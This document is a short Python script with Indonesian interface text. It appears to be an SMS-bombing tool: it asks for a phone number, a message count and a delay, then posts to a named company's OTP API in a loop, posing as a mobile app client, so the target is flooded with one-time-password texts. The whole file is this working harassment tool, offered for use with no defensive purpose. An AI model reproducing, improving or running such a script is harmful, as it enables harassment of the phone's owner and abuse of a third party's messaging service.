import os,requests,sys,time,json

head = {
	'Content-Type':'application/json',
	'Host':'kiosondev.app.narindo.com',
	'Connection':'Keep-Alive',
	'Accept-Encoding':'gzip',
	'User-Agent':'okhttp/3.8.0'
}
url = 'https://kiosondev.app.narindo.com/api/v1/otp'

class Kioson:
	def __init__(self,nomor,jumlah,delay):
		print()
		self.nomor = nomor
		self.jumlah = jumlah
		self.delay = delay
		self.spam()
	def spam(self):
		for i in range(1,int(self.jumlah)+1):
			try:
				r = requests.post(url,headers=head,json=
			{
				'appType':'KIOSON',
				'msisdn':self.nomor
			})
				js = json.loads(r.text)
				if 'success' in js['msg']:
					print (f"\033[0m[\033[92m{i}\033[0m] Sukses terkirim ke\033[95m",self.nomor,'\033[0m')
				else:
					print (r.text)
				time.sleep(int(self.delay))
			except requests.exceptions.ConnectionError:
				i-=1
				continue
while True:
	try:
		nomor = input('\033[96m[+]\033[0m No Hp : ')
		if nomor == '':
			print ('\033[91m[!]\033[0m Jangan Kosong Gan!')
			break
		jumlah = input('\033[96m[+]\033[0m Count : ')
		if jumlah == '':
			print ('\033[91m[!]\033[0m Jangan Kosong Gan!')
			break
		delay = input('\033[96m[+]\033[0m Delay : ')
		if delay == '':
			print ('\033[91m[!]\033[0m Jangan Kosong Gan!')
			break

		Kioson(nomor,jumlah,delay)
		exit()
	except KeyboardInterrupt:
		exit('\n')
	except Exception as A:
		exit(f"[Err]: {A}")
